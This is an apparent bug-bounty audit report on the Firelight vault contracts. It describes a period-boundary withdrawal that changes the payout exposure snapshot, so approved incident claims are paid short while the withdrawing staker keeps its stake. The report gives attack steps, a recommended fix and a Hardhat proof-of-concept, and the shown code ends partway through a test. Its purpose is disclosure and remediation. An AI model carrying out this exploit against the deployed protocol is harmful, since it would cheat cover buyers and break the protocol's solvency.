# 89908 sc high mutable period start exposure snapshot in firelightvault payout leads to protocol insolvency approved incident claims underpaid&#x20;

**Submitted on Aug 21st 2026 at 18:45:12 UTC by @chaincasper for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89908
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Intro

`FirelightVault.payout()` caps an incident payout at `totalAssetsAt(capturePeriodStart)`, which is meant to be the vault's fixed exposure at the start of the covered period. That value is not immutable: a staker who withdraws in the block whose timestamp equals the period start `S` writes a lower total at key `S` and drops the cap by the withdrawn amount, while the allocator has already committed cover capacity against the higher pre-withdrawal exposure and cover later settles against that commitment without re-checking exposure. Once the in-scope V2/Phase-2 topology is deployed, an ordinary permissionless staker can use this to escape the slash that should fund an approved incident claim. The claim is then paid short from the vault leg by the amount withdrawn, and the incident still closes with no on-chain retry, so Firelight cannot honor a capacity-backed obligation. The shortfall equals the attacker's boundary withdrawal, so it is bounded by the stake the attacker controls. That bound is not a comfort: the exploit spares that withdrawal from the slash it would otherwise take (entirely at `x = A`, when the attacker controls all active exposure), so the attacker preserves its own capital and the damage scales with the stake it holds or coordinates, up to the whole vault (about 57M fXRP, roughly $80M at current XRP prices).

## Vulnerability Details

`FirelightVault.payout()` caps an incident payout at `totalAssetsAt(capturePeriodStart)` and treats that value as the fixed period-start exposure, but it is not immutable. A withdrawal executed in a block whose timestamp equals the period start appends or replaces the period-start checkpoint, changing the inclusive `totalAssetsAt(S)` result downward, so collateral that backed sold cover escapes the payout.

This breaks invariants the protocol documents as intended. Firelight's staker documentation states that a pending withdrawal takes the same pro-rata slash as an active position and that no vault position is exempt from that slash (["Deployments and withdrawals"](https://docs.firelight.finance/for-stakers/deployments-and-withdrawals), ["Risk and exposure"](https://docs.firelight.finance/for-stakers/risk-and-exposure)); capital should not be able to exit ahead of the obligations it backed. The claims documentation states that an approved loss within payout capacity pays in full (["Claims liquidation"](https://docs.firelight.finance/protocol-architecture/claims-liquidation)). The defect below violates both: capture-period withdrawals are kept nominally slashable, yet the mutable snapshot lets the withdrawn capital escape the vault leg while an approved, within-capacity claim is short-paid.

`payout()` caps the amount by the active assets recorded at the start of the covered period, and separately keeps capture-period withdrawals payable so exposed assets cannot escape a slash:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

The design intends `assetsAtCapturePeriod` to be the full period-start exposure `A`. A withdrawal of `x` during the period moves `x` out of active assets into `withdrawAssets[capturePeriod + 1]`, so `currentActiveAssets` falls to `A - x` while `capturePeriodWithdrawals` rises to `x`. In the clean single-withdrawal case the PoC demonstrates, this leaves `activePayableAmount` at `A`, so the payout can still draw the full `A` and slash the withdrawal proportionally.

`totalAssetsAt()` is an inclusive lookup over a timestamp-keyed trace:

```solidity
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

Every `withdraw()` and `redeem()` calls `_logTrace()`, which pushes the reduced total at the current block timestamp:

```solidity
uint48 ts = Time.timestamp();
...
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

`Checkpoints.push()` overwrites the stored value when the key already exists, and appends a new entry otherwise:

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

When a staker withdraws `x` in a transaction whose `block.timestamp` equals `currentPeriodStart()`, `_logTrace()` pushes `A - x` at key `S = currentPeriodStart()`, overwriting or appending at the period-start checkpoint. From then on `totalAssetsAt(S)` returns `A - x` instead of `A`. This same snapshot also feeds the allocator: `CoverOrderAllocator._computeAvailableCapacity()` reads `vault.totalAssetsAt(vault.currentPeriodStart())`, so cover is committed against `A` while the later payout is capped at `A - x`.

Settlement never rechecks the snapshot. `CoverOrderAllocator._settleCoverOrder()` checks the order status, the period, the grace period, the Merkle proof, the per-market allocations, the recomputed premium, and the protocol-concentration caps, but it does not recompute vault exposure. Its capacity and concentration checks rely on the stored commitment. Once one leaf settles, `CoverOrderAllocator._replaceableCommitment()` locks the commitment against cancellation and recommit (`commit.totalSettledCover > 0`).

When a valid incident whose capture timestamp maps to `S` is approved, `IncidentManager._executePayout()` calls `payout()`, which computes `paidAmount = Math.min(amount, Math.min(A - x, activePayableAmount))`. For a full-loss request the cap is `A - x`, so the beneficiary is short-paid by `x`. At the maximum `x = A` the cap is zero, the vault transfers nothing, and `payout()` still returns to the caller because it processes the incident even when `paidAmount` is zero, so `IncidentManager` closes the incident. Two periods later the staker calls `claimWithdraw()` and collects the withdrawal that should have been slashed, up to the full `x` at `x = A`.

## Impact Details

An approved incident claim that should draw on staked collateral is short-paid from the vault-backed leg. For a period-start exposure `A` and a boundary withdrawal of `x`, the payout cap falls from `A` to `A - x`, so a full-loss claim is underpaid by `x`, up to the entire vault-backed leg. At the maximum `x = A` (the attacker controls, or coordinates withdrawals covering, all active exposure) the vault leg pays zero. The first-loss buffer still pays its own leg, so the loss is bounded by the period-start vault exposure, not the entire covered amount, and the withdrawing staker keeps the collateral that should have been slashed.

The incident closes `CLOSED` with no IncidentManager-level retry (a closed incident cannot be re-approved), and because the cap `totalAssetsAt(S)` stays at zero at `x = A`, even a repeat `payout()` call draws nothing, so the vault leg cannot be topped up. Firelight cannot honor an approved obligation that was within its contemporaneously committed capacity. This maps to the program's Critical protocol insolvency class. `FirelightVault.payout()` documents the period-start value as "an exposure cap, not a segregated asset bucket", so the loss is best framed as failure to honor a capacity-backed obligation rather than theft from a reserved bucket.

The PoC drives the full stack at mainnet-scale amounts: a 57,000,000 fXRP vault, a funded 5,000,000-token first-loss buffer, and 62,000,000 of cover sold for the period. The vault leg is 57,000,000. On the approved claim it pays zero, while the first-loss buffer still pays its 5,000,000, so the protocol covers only 5,000,000 of the 62,000,000 assessed loss. The approved claim is short-paid by 57,000,000 (the entire vault-backed leg), and the unprivileged staker later claims that 57,000,000 back.

Funds at risk. The shortfall per qualifying incident is bounded by the period's vault-backed exposure `A`. The deployed vault holds on the order of 57M fXRP (a public balance read on `0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3`), which the PoC reproduces as a token quantity. The PoC prices fXRP at $1 with an illustrative oracle, so its 57M vault leg is a token figure, not a USD amount. Valued at the current XRP price (about $1.41, CoinGecko 2026-08-21), that quantity is a theoretical upper bound of about $80M, reached only with enough settled cover, a genuine assessed loss, and a boundary withdrawal covering all active exposure (`x = A`). A single existing holder reaches only its fraction of the vault, so a lone attacker's shortfall is a proportional fraction, not the full amount. But because the attacker recovers its withdrawn stake (fully at `x = A`), the ceiling is set by the exposure one actor can hold or coordinate, not by any principal loss, so a large staker is incentivized to boundary-time its exits. XRP is volatile, so the USD figure is a point-in-time estimate.

## Exploit Conditions

External (not controlled by the attacker):

* An honest `commitAllocation(P)` transaction executes at exactly timestamp `S = currentPeriodStart()` and is ordered before the attacker's withdrawal in the same block, so it stores capacity against the pre-withdrawal exposure `A`. Flare's short block times mean a block at the exact boundary timestamp can occur, but the attacker still needs a block at `S`, a commit in it, and later same-block ordering.
* A genuine incident for period P is captured after the period's cover has settled, is on-chain valid, and is honestly approved. The attacker cannot manufacture this external loss.
* The assessed loss exceeds the first-loss buffer, so the payout draws on the vault leg. The price feed is fresh and the FLB/receiver allowances and role wiring are operational.

Internal (attacker-controlled):

* The attacker already holds vault shares from an ordinary permissionless deposit and is not paused or blocklisted.
* The attacker anticipates or observes the boundary commit and obtains later same-block ordering for `withdraw()`/`redeem()` in the boundary block, before the payout.
* The attacker's withdrawal is the final net-deflating write at key `S`. A later same-`S` deposit or reward checkpoint would raise the lookup back up.
* The `x = A` maximum (vault leg pays zero) additionally requires the attacker to control all active exposure, or to coordinate enough withdrawals to drive the final `S` value to zero.

These conditions do not invalidate the finding. The state transition is code-backed and demonstrated end to end. They are adjudication-sensitive: a genuine incident must occur, the attacker cannot create or guarantee it, exact-boundary ordering is required, and privileged roles have a detection-and-recovery window (see the mitigation note below). They materially affect likelihood.

## Recommendation

Consider the following:

Make the period-start exposure immutable once it can authorize cover, so a later same-timestamp write cannot change it. The smallest additive fix rejects commits at the exact boundary timestamp, which forces the authorizing snapshot to be read only after any boundary-block writes have already executed:

```solidity
// in commitAllocation and recommitAllocation
if (block.timestamp == vault.currentPeriodStart()) revert CommitAtPeriodBoundary();
```

Once a later timestamp is reached, monotonically increasing keys prevent any future checkpoint from overwriting or appending at `S`, so `totalAssetsAt(S)` is fixed.

A more explicit design finalizes a single `periodExposure[period]` value once per period and uses it in both `CoverOrderAllocator._computeAvailableCapacity()` and `FirelightVault.payout()` instead of re-reading the timestamp-keyed trace, which removes the dependence on checkpoint key collisions entirely.

Keep capture-period withdrawal buckets inside `activePayableAmount`; they are meant to stay slashable. Add an invariant test that commits at and after the period rollover, performs same-block deposits and withdrawals in every ordering, settles, captures a post-settlement incident with an exhausted first-loss buffer, and checks the P+2 claim path.

## Proof of Concept

## Attack Path

1. At the start of period P (timestamp `S`), an honest `commitAllocation(P)` transaction executes in the boundary block, reads `totalAssetsAt(S) = A`, and stores capacity sized against `A`.
2. In a later transaction of the same block, still at timestamp `S`, the attacker calls `withdraw()` or `redeem()` for `x`. `_logTrace()` pushes `A - x` at key `S`, which appends or replaces the period-start checkpoint, so `totalAssetsAt(S)` now returns `A - x`.
3. The withdrawal is recorded in `withdrawAssets[P + 1]`, which the vault treats as still slashable, so `activePayableAmount` stays at `A`.
4. After the grace period the cover order settles against the stored capacity, and settlement does not re-read `totalAssetsAt(S)`. Once the first leaf settles, the commitment can no longer be cancelled or recommitted.
5. A genuine incident for period P (one the attacker cannot manufacture) is captured after settlement, its timestamp maps to `S`, and an honest approver approves it; `IncidentManager._executePayout()` calls `payout()`.
6. `payout()` reads `totalAssetsAt(S) = A - x` as the exposure cap, so `paidAmount` is capped at `A - x` (zero when `x = A`), and the incident closes even though the vault leg is short-paid by up to the full `x`.
7. At period P+2, after the payout window closes, the attacker calls `claimWithdraw()` and receives the withdrawal that should have been slashed, the full `x` at `x = A`.

## Proof of Concept

File: `test/poc/b008_period_boundary_payout_snapshot.js`

The PoC is a single Hardhat test file (two cases) in the project's own style, over the repo's own `test/setup/fixtures.js` `deployVault` fixture (ethers v6, `@openzeppelin/merkle-tree`). It deploys fresh, real `FirelightVault` (the V2 upgrade implementation), `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`; only the fXRP asset, the premium/FLB stablecoins, and the price feed are mocked external dependencies. The attacker is an ordinary permissionless staker and every privileged role acts honestly; the test asserts the attacker holds none of the allocator, curator, approver, payout, pause, blocklist, or rescue roles. Amounts are mainnet-scale (a 57,000,000 fXRP vault) so the demonstrated shortfall is representative of the deployed vault without a fork.

Setup and cheatcode disclosure (all legitimate; none fabricate exploit proceeds). There is no `setStorageAt`/`setCode`. `setBalance` gas-funds the test's role signers, and (inside the repo's own `deployVault`/`deployFAsset` fixture) the impersonated mock FAsset asset-manager that mints the initial test balances of the underlying asset, the same way real FXRP is minted by its asset manager. That impersonation only mints the mocked underlying, never any attacker capability. The exact-boundary case also uses timestamp control, disabled automining, and gas-price ordering. These are deterministic simulations of the disclosed external timing and order precondition (an honest commit and the attacker's withdrawal executing in the same block at timestamp `S`, commit first), not extra privileges. Funds are traced from the vault's own assets through balance deltas.

* **Exploit (`x = A`).** It commits and settles 62,000,000 of cover for a period against 57,000,000 of vault assets and a funded 5,000,000-token first-loss buffer, then has the staker withdraw the full vault exposure in a transaction whose block timestamp equals the period start (commit at tx index 0, withdrawal at tx index 1 in the same block). It captures a valid incident for the period after settlement, approves it, and asserts the vault leg pays zero while the first-loss buffer contributes its 5,000,000. It then advances two periods and asserts the staker claims the full 57,000,000.
* **Control (`S + 1`).** The same withdrawal one second later shows the vault leg paying the full 57,000,000 and leaving no surviving withdrawal. It asserts the commit and withdrawal block timestamps are exactly `S` and `S + 1`, isolating the exact-`S` write: it keeps the same commit-before-withdraw sequence, but the withdrawal is mined in the next block, and `claimWithdraw()` then reverts `NoWithdrawalAmount` because the withdrawal was fully slashed into the payout.

Run it self-contained against the in-scope repository branch, with no fork and no external RPC:

```
npx hardhat test test/poc/b008_period_boundary_payout_snapshot.js
```

This is a runnable, self-contained proof against the in-scope repo that demonstrates the actual on-chain outcome. A mainnet fork is not required.

Expected output (per-test millisecond timings vary between runs):

```
  PoC B-008: a period-boundary withdrawal mutates the payout exposure snapshot
=== SETUP (mainnet-scale amounts, fXRP) ===
staker vault deposit (A) : 57000000.0
funded first-loss buffer : 5000000.0
cover sold for period    : 62000000.0
=== EXPLOIT ===
commit tx index          : 0
withdraw tx index        : 1
totalAssetsAt(S) before  : 57000000.0 (observed pre-block read)
totalAssetsAt(S) after   : 0.0 <-- snapshot mutated to A - x
=== RESULT ===
incident assessment loss : 62000000.0
first-loss buffer paid   : 5000000.0
vault leg requested      : 57000000.0
vault leg PAID           : 0.0 <-- should equal the vault leg
claim underpayment       : 57000000.0
staker claimed at P+2    : 57000000.0 <-- collateral that should have paid the claim
    ✔ exact-boundary withdrawal makes an approved full-loss claim pay 0 while the staker keeps its whole stake
=== CONTROL (withdraw at S+1) ===
totalAssetsAt(S)         : 57000000.0 <-- unchanged
vault leg PAID           : 57000000.0 <-- full vault leg, no leak
    ✔ control: the same withdrawal one block later (S+1) is fully slashed and pays the claim in full

  2 passing
```

The exploit test drives `totalAssetsAt(S)` from 57,000,000 to 0 with the boundary withdrawal (the `before` value is an observed pre-block read). The funded first-loss buffer is exhausted first. The valid, approved incident then pays 0 of the 57,000,000 requested from the vault leg, and the incident still closes. Two periods later the separate, unprivileged staker calls `claimWithdraw()` and receives the full 57,000,000, the collateral that should have funded the claim. The control moves the withdrawal one second past the boundary, leaving `totalAssetsAt(S) = 57,000,000`. The vault leg then pays the full 57,000,000 and `claimWithdraw()` reverts `NoWithdrawalAmount`, isolating the exact-`S` write as the cause.

`CoverOrderAllocator`, `CoverNFT`, and `IncidentManager` are Phase-2 contracts with no mainnet deployment yet, so the full `commit → withdraw → settle → incident → payout → claim` path is exercised end to end against freshly deployed, in-scope contracts.

## Proof of Concept Code

File: `test/poc/b008_period_boundary_payout_snapshot.js`

```
// PoC for B-008:
//
//   "Mutable period-start exposure snapshot in FirelightVault.payout() leads to
//    protocol insolvency (approved incident claims underpaid)."
//
// Root cause: FirelightVault.payout() caps an incident payout at
// totalAssetsAt(capturePeriodStart). That snapshot is a timestamp-keyed
// Checkpoints trace, and every withdraw()/redeem() pushes the reduced total at
// the current block timestamp. A withdrawal in a block whose timestamp equals
// currentPeriodStart() writes a lower total at key S (appending a checkpoint, or
// replacing one if an earlier same-timestamp checkpoint exists), so the inclusive
// lookup totalAssetsAt(S) returns the reduced amount. This drops the payout cap by
// the withdrawn amount, while the same withdrawal is still parked in the slashable
// withdrawAssets[P+1] bucket. The allocator has already committed capacity against
// the higher pre-withdrawal exposure, and cover later settles against that
// commitment without re-checking exposure, so a valid, approved claim is short-paid
// from the vault leg, and the staker later claims that collateral back.
//
// The exploit test drives the full stack end to end with real in-scope contracts:
//   commitAllocation(P) then exact-boundary withdraw() in the same block
//     -> grace -> settleCoverOrder -> create/confirm/assess/approve incident
//     -> vault payout (pays 0 of the full vault leg)
//     -> P+2 claimWithdraw (staker keeps its whole stake)
//
// The control test moves the withdrawal one second past the boundary, which leaves
// totalAssetsAt(S) unchanged and makes the vault leg pay in full. It keeps the same
// commit-before-withdraw sequence, but the withdrawal is mined in the next block,
// isolating the exact-S write as the cause.
//
// Amounts are mainnet-scale (a 57,000,000 fXRP vault, matching the deployed vault's
// token holdings) so the numbers are representative of the vault's size without a fork.
// The oracle prices fXRP at $1 (illustrative), so these are token quantities, not USD.
// This test withdraws the whole vault (x = A), the maximum case; a lone attacker's
// shortfall is bounded by its own stake.
//
// Self-contained: deploys fresh real FirelightVault (the V2 upgrade implementation),
// CoverOrderAllocator, CoverNFT, and IncidentManager against the in-scope repo, over
// the repo's own deployVault fixture. No mainnet fork required:
//   npx hardhat test test/poc/b008_period_boundary_payout_snapshot.js

const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { expect } = require('chai')
const { ethers, network, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const { deployVault } = require('../setup/fixtures.js')

const E6 = 10n ** 6n
const CANON = 10n ** 18n
const PERIOD = 86_400n
const GRACE = 60n
const YEAR = 365n * 24n * 60n * 60n
const DEPOSIT = 57_000_000n * E6 // staker vault exposure, A (mainnet-scale)
const FLB_BALANCE = 5_000_000n * E6 // funded first-loss buffer leg
const COVER = 62_000_000n * CANON // canonical cover sold for the period (A + FLB)
const RATE_BPS = 500n

const fmt6 = (v) => ethers.formatUnits(v, 6)

async function fundedSigner() {
  const wallet = ethers.Wallet.createRandom().connect(ethers.provider)
  await network.provider.send('hardhat_setBalance', [
    wallet.address,
    '0x3635C9ADC5DEA00000', // 1000 ETH, gas money only
  ])
  return wallet
}

async function deployFullStack() {
  const vaultFixture = await deployVault({
    decimals: 6,
    initial_deposit_limit: 10n ** 18n,
    period_configuration_duration: Number(PERIOD),
  })
  const {
    firelight_vault: vault,
    token_contract: asset,
    deployer,
    users,
    utils,
  } = vaultFixture

  const admin = deployer
  const curator = await fundedSigner()
  const allocatorRole = await fundedSigner()
  const approver = await fundedSigner()
  const rejecter = await fundedSigner()
  const invalidator = await fundedSigner()
  const configAdmin = await fundedSigner()
  const premiumCollector = await fundedSigner()
  const flbWallet = await fundedSigner()
  const payoutReceiver = await fundedSigner()
  const allowlister = await fundedSigner()

  const MockERC20 = await ethers.getContractFactory('MockERC20')
  const usdc = await MockERC20.deploy('USDC', 'USDC', 6)
  const flb = await MockERC20.deploy('First-loss buffer', 'FLB', 6)

  const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
  const priceFeed = await MockAggregator.deploy(18, CANON)

  const CoverNFT = await ethers.getContractFactory('CoverNFT')
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    [
      'Firelight Cover',
      'FLCOVER',
      '',
      admin.address,
      deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
    ],
    { kind: 'transparent' },
  )

  const chainId = 1
  const protocol = 'Morpho'
  const market = ethers.encodeBytes32String('market-A')
  const marketId = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ['uint64', 'string', 'bytes32'],
      [chainId, protocol, market],
    ),
  )

  // A 1x capacity multiplier makes the comparison exact: the vault assets plus a
  // funded FLB back precisely `COVER` canonical dollars (57M + 5M = 62M).
  const capacityConfig = {
    minCAR: 12_000,
    firstLossBufferToken: await flb.getAddress(),
    firstLossBuffer: flbWallet.address,
    effectiveLeverage: 12_000,
    minOrderMarketCoverAmount: 1,
    divergenceToleranceBps: 0,
  }

  const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
  const allocator = await upgrades.deployProxy(
    Allocator,
    [
      {
        vault: await vault.getAddress(),
        premiumCollector: premiumCollector.address,
        coverNFT: await coverNFT.getAddress(),
        priceFeedAdapter: await priceFeed.getAddress(),
        maxPriceAge: Number(PERIOD),
        premiumTokens: [await usdc.getAddress()],
        admin: admin.address,
        adminRole: admin.address,
        curatorRole: curator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [
          {
            protocol,
            chainId,
            maxProtocolConcentrationBps: 10_000,
          },
        ],
        newMarkets: [{ chainId, protocol, market }],
        capacityConfig,
      },
    ],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
  )

  await allocator.connect(configAdmin).setSettlementGracePeriod(GRACE)

  const IncidentManager = await ethers.getContractFactory('IncidentManager')
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      admin.address,
      curator.address,
      approver.address,
      rejecter.address,
      invalidator.address,
      configAdmin.address,
      admin.address,
      admin.address,
      payoutReceiver.address,
      await allocator.getAddress(),
      await priceFeed.getAddress(),
      Number(PERIOD),
    ],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
  )

  await coverNFT
    .connect(admin)
    .grantRole(ethers.id('MINTER_ROLE'), await allocator.getAddress())
  await vault
    .connect(admin)
    .grantRole(await vault.PAYOUT_ROLE(), await incidentManager.getAddress())
  await vault
    .connect(admin)
    .grantRole(await vault.INCIDENT_ROLE(), await incidentManager.getAddress())
  await vault
    .connect(admin)
    .grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), allowlister.address)
  await vault.connect(allowlister).addToPayoutAllowlist(payoutReceiver.address)

  // Fund and approve a real first-loss leg. The claim deliberately exhausts it
  // before reaching the mutated vault snapshot, so the proof does not rely on any
  // unescrowed or underfunded-FLB assumption.
  await flb.mint(flbWallet.address, FLB_BALANCE)
  await flb
    .connect(flbWallet)
    .approve(await incidentManager.getAddress(), FLB_BALANCE)

  // Keep the withdrawing staker and the covered buyer distinct. This rules out any
  // argument that the result is merely the same actor moving value between its own
  // stake and its own claim. The staker is an ordinary, unprivileged depositor.
  const staker = users[0]
  const buyer = users[1]
  await utils.mintAndApprove(DEPOSIT, staker)
  await vault.connect(staker).deposit(DEPOSIT, staker.address)

  await allocator.connect(curator).createCoverOrder(
    buyer.address,
    buyer.address,
    buyer.address,
    await usdc.getAddress(),
    [{ marketId, coverRateAnnual: Number(RATE_BPS), coverAmount: COVER }],
    0,
  )
  const orderId = (await allocator.nextCoverOrderId()) - 1n

  const premiumCanonical =
    (COVER * RATE_BPS * PERIOD + 10_000n * YEAR - 1n) / (10_000n * YEAR)
  const premiumNative = (premiumCanonical + 10n ** 12n - 1n) / 10n ** 12n
  await usdc.mint(buyer.address, premiumNative)
  await usdc.connect(buyer).approve(await allocator.getAddress(), premiumNative)

  const tree = StandardMerkleTree.of(
    [[orderId, [[marketId, COVER]]]],
    ['uint256', '(bytes32,uint256)[]'],
  )
  let proof
  for (const [index, leaf] of tree.entries()) {
    if (leaf[0] === orderId) proof = tree.getProof(index)
  }

  return {
    ...vaultFixture,
    vault,
    asset,
    usdc,
    flb,
    priceFeed,
    coverNFT,
    allocator,
    incidentManager,
    curator,
    allocatorRole,
    approver,
    configAdmin,
    premiumCollector,
    flbWallet,
    payoutReceiver,
    staker,
    buyer,
    marketId,
    orderId,
    tree,
    proof,
    premiumNative,
  }
}

// Commits cover at the period boundary, then withdraws the staker's full stake
// `withdrawOffset` seconds later. withdrawOffset === 0n mines the withdrawal in the
// exact boundary block (the exploit); withdrawOffset === 1n mines it one second and
// one block later (the control).
async function commitAtBoundary(ctx, withdrawOffset) {
  // `boundary` is the period-start timestamp the finding calls S. The vault's
  // currentPeriodEnd() of the current period is, by construction, the start of the
  // NEXT period (currentPeriodEnd = epoch + (n+1)*duration, currentPeriodStart =
  // epoch + n*duration), and that next period is the one the cover is committed for.
  // The commit and the exact-boundary withdrawal are mined in the block at exactly
  // this timestamp, so from that block onward currentPeriodStart() == boundary == S.
  // S is the single checkpoint key the allocator commit reads (as A) and payout()
  // later caps against (as A - x), which is why they collide.
  const boundary = await ctx.vault.currentPeriodEnd()

  // Observed pre-withdrawal exposure: the inclusive lookup at the boundary key
  // BEFORE the commit/withdraw block is mined. This is the value the allocator
  // commit reads (upperLookupRecent(S) returns the last deposit checkpoint = A).
  const exposureBefore = await ctx.vault.totalAssetsAt(boundary)

  // Keep the oracle fresh, while remaining inside the order-creation period.
  await time.setNextBlockTimestamp(boundary - 1n)
  await ctx.priceFeed.setAnswer(CANON)

  if (withdrawOffset === 0n) {
    // Both transactions execute in the exact boundary block. Disabled automining plus
    // timestamp control and gas-price ordering are deterministic simulations of the
    // disclosed same-block timing/order precondition: a higher gas price on the
    // commit orders it before the staker withdrawal, at block timestamp exactly S.
    await network.provider.send('evm_setAutomine', [false])
    try {
      await network.provider.send('evm_setNextBlockTimestamp', [Number(boundary)])
      const commitTx = await ctx.allocator
        .connect(ctx.allocatorRole)
        .commitAllocation(1, ctx.tree.root, COVER, COVER, {
          gasLimit: 5_000_000,
          gasPrice: 100n * 10n ** 9n,
        })
      const withdrawTx = await ctx.vault
        .connect(ctx.staker)
        .withdraw(DEPOSIT, ctx.staker.address, ctx.staker.address, {
          gasLimit: 5_000_000,
          gasPrice: 10n * 10n ** 9n,
        })
      await network.provider.send('evm_mine')

      const commitReceipt = await commitTx.wait()
      const withdrawReceipt = await withdrawTx.wait()
      expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber)
      expect(commitReceipt.index).to.be.lessThan(withdrawReceipt.index)
      const block = await ethers.provider.getBlock(commitReceipt.blockNumber)
      expect(BigInt(block.timestamp)).to.equal(boundary)

      return { boundary, commitReceipt, withdrawReceipt, exposureBefore }
    } finally {
      await network.provider.send('evm_setAutomine', [true])
    }
  }

  await time.setNextBlockTimestamp(boundary)
  const commitTx = await ctx.allocator
    .connect(ctx.allocatorRole)
    .commitAllocation(1, ctx.tree.root, COVER, COVER)
  const commitReceipt = await commitTx.wait()

  await time.setNextBlockTimestamp(boundary + withdrawOffset)
  const withdrawTx = await ctx.vault
    .connect(ctx.staker)
    .withdraw(DEPOSIT, ctx.staker.address, ctx.staker.address)
  const withdrawReceipt = await withdrawTx.wait()

  return { boundary, commitReceipt, withdrawReceipt, exposureBefore }
}

async function settleAndApproveIncident(ctx, boundary) {
  const commit = await ctx.allocator.getAllocationCommitment(1)
  expect(commit.totalAvailableCapacity).to.equal(COVER)
  expect(commit.totalDeclaredAllocated).to.equal(COVER)

  await time.increaseTo(boundary + GRACE + 1n)
  await ctx.allocator
    .connect(ctx.allocatorRole)
    .settleCoverOrder(
      ctx.orderId,
      [{ marketId: ctx.marketId, allocatedCover: COVER }],
      ctx.proof,
    )
  expect(await ctx.coverNFT.ownerOf(ctx.orderId)).to.equal(ctx.buyer.address)

  // Capture the incident only after settlement has activated the cover. This keeps
  // the proof independent from any late-settlement or backdated-claim issue.
  const captureTimestamp = await time.latest()
  await ctx.incidentManager
    .connect(ctx.curator)
    .createIncident(
      captureTimestamp,
      'B-008 post-settlement incident',
      ethers.id('b008-post-settlement-incident'),
    )
  const incidentId = (await ctx.incidentManager.nextIncidentId()) - 1n
  await ctx.incidentManager
    .connect(ctx.curator)
    .confirmIncident(incidentId, 'ipfs://b008')
  await ctx.incidentManager
    .connect(ctx.curator)
    .addAssessmentLosses(incidentId, [
      { coverTokenId: ctx.orderId, marketId: ctx.marketId, amount: COVER },
    ])
  await ctx.incidentManager
    .connect(ctx.curator)
    .submitCurrentAssessment(incidentId)

  // Refresh the same feed used by both capacity and incident payout.
  await ctx.priceFeed.setAnswer(CANON)
  const vaultReceiverBefore = await ctx.asset.balanceOf(ctx.payoutReceiver.address)
  const flbReceiverBefore = await ctx.flb.balanceOf(ctx.payoutReceiver.address)
  const approvalTx = await ctx.incidentManager
    .connect(ctx.approver)
    .approveCurrentAssessment(incidentId)
  const approvalReceipt = await approvalTx.wait()
  const vaultReceiverDelta =
    (await ctx.asset.balanceOf(ctx.payoutReceiver.address)) - vaultReceiverBefore
  const flbReceiverDelta =
    (await ctx.flb.balanceOf(ctx.payoutReceiver.address)) - flbReceiverBefore

  const payoutEvent = approvalReceipt.logs
    .map((log) => {
      try {
        return ctx.vault.interface.parseLog(log)
      } catch {
        return null
      }
    })
    .find((event) => event && event.name === 'PayoutExecuted')
  expect(payoutEvent).not.to.equal(undefined)

  const incidentPayoutEvent = approvalReceipt.logs
    .map((log) => {
      try {
        return ctx.incidentManager.interface.parseLog(log)
      } catch {
        return null
      }
    })
    .find((event) => event && event.name === 'IncidentPayoutExecuted')
  expect(incidentPayoutEvent).not.to.equal(undefined)

  const [incident] = await ctx.incidentManager.getIncident(incidentId)
  expect(incident.status).to.equal(4n) // CLOSED

  return {
    incidentId,
    captureTimestamp,
    firstLossPaid: incidentPayoutEvent.args.firstLossTokenAmount,
    totalAssessmentLoss: incidentPayoutEvent.args.totalAssessmentLoss,
    requested: payoutEvent.args.requestedAmount,
    paid: payoutEvent.args.paidAmount,
    vaultReceiverDelta,
    flbReceiverDelta,
  }
}

async function advancePastPayoutWindow(vault) {
  await time.increaseTo((await vault.currentPeriodEnd()) + 1n)
  await time.increaseTo((await vault.currentPeriodEnd()) + 1n)
}

// Asserts `who` holds none of the privileged roles the exploit could otherwise be
// dismissed as relying on. The only capability the attacker uses is a permissionless
// withdraw()/redeem(), which carries no role.
async function assertUnprivileged(ctx, who) {
  const checks = [
    [ctx.vault, 'PAYOUT_ROLE'],
    [ctx.vault, 'PAUSE_ROLE'],
    [ctx.vault, 'BLOCKLIST_ROLE'],
    [ctx.vault, 'RESCUER_ROLE'],
    [ctx.vault, 'INCIDENT_ROLE'],
    [ctx.allocator, 'ALLOCATOR_ROLE'],
    [ctx.allocator, 'CURATOR_ROLE'],
    [ctx.incidentManager, 'CURATOR_ROLE'],
    [ctx.incidentManager, 'ASSESSMENT_APPROVER_ROLE'],
  ]
  for (const [contract, roleName] of checks) {
    const role = await contract[roleName]()
    expect(
      await contract.hasRole(role, who),
      `attacker must not hold ${roleName}`,
    ).to.equal(false)
  }
}

describe('PoC B-008: a period-boundary withdrawal mutates the payout exposure snapshot', function () {
  this.timeout(600_000)

  it('exact-boundary withdrawal makes an approved full-loss claim pay 0 while the staker keeps its whole stake', async function () {
    const ctx = await loadFixture(deployFullStack)

